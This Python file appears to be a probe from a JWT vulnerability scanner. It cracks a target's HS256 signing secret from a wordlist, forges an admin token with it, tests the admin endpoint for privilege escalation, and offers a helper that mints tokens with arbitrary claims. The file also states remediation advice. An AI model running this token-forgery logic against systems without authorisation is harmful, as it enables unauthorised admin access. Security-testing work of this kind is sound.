"""P2: weak HMAC signing secret.

Cracks the legitimate token's HS256 secret against a wordlist, then forges an
admin token signed with the recovered secret. CONFIRMS only on HTTP 200 +
escalation.
"""

from __future__ import annotations

from typing import Any, Optional

from rich.console import Console

from ..client import AuthClient, Baseline
from ..cracker import crack_hs256
from ..forge import hs256_token
from ..models import Evidence, Finding, ForgeCapability, Severity, Target, Verdict
from .base import Probe, register

_console = Console()
_ADMIN_CLAIMS: dict[str, Any] = {"sub": "alice", "username": "alice", "role": "admin"}


class WeakSecretProbe(Probe):
    id = "weak_secret"
    title = "weak HMAC signing secret"
    severity = Severity.CRITICAL
    cwe = "CWE-326"
    remediation = (
        "Use a high-entropy, randomly generated signing secret of at least 256 bits, "
        "kept out of source control and rotated if exposure is suspected. Prefer "
        "asymmetric signing (RS256/ES256) so the verification key is not a shared secret."
    )

    def __init__(self) -> None:
        self._cracked_secret: Optional[str] = None

    def run(
        self,
        client: AuthClient,
        target: Target,
        baseline: Baseline,
        capability: ForgeCapability,
    ) -> Finding:
        request_line = f"GET {target.admin_path}"

        with _console.status(
            f"[cyan]weak_secret: cracking HS256 secret against {target.wordlist_path} ...",
            spinner="dots",
        ):
            secret = crack_hs256(baseline.token, target.wordlist_path)

        if secret is None:
            evidence = Evidence(
                forged_token=None,
                request_line=request_line,
                status_code=None,
                response_snippet="",
                note="no HS256 secret recovered from wordlist",
            )
            return self._finding(Verdict.NOT_VULNERABLE, evidence)

        self._cracked_secret = secret
        forged = hs256_token(_ADMIN_CLAIMS, secret)
        resp = client.get(target.admin_path, forged)
        snippet = resp.text[:200]

        if client.is_escalated(resp, baseline):
            evidence = Evidence(
                forged_token=forged,
                request_line=request_line,
                status_code=resp.status_code,
                response_snippet=snippet,
                note=f"cracked HS256 secret: '{secret}'; forged admin token accepted",
            )
            return self._finding(Verdict.CONFIRMED, evidence)

        evidence = Evidence(
            forged_token=forged,
            request_line=request_line,
            status_code=resp.status_code,
            response_snippet=snippet,
            note=f"cracked HS256 secret: '{secret}' but forged token was rejected",
        )
        return self._finding(Verdict.NOT_VULNERABLE, evidence)

    def _finding(self, verdict: Verdict, evidence: Evidence) -> Finding:
        return Finding(
            probe_id=self.id,
            title=self.title,
            verdict=verdict,
            severity=self.severity,
            cwe=self.cwe,
            evidence=evidence,
            remediation=self.remediation,
        )

    def forge_capability(self) -> Optional[ForgeCapability]:
        if self._cracked_secret is None:
            return None
        secret = self._cracked_secret

        def mint(claims: dict[str, Any]) -> str:
            payload: dict[str, Any] = {"sub": "alice", "username": "alice"}
            payload.update(claims)
            return hs256_token(payload, secret)

        return ForgeCapability(
            gained=True,
            method="weak_secret",
            detail=f"secret='{secret}'",
            secret=secret,
            mint=mint,
        )


register(WeakSecretProbe())
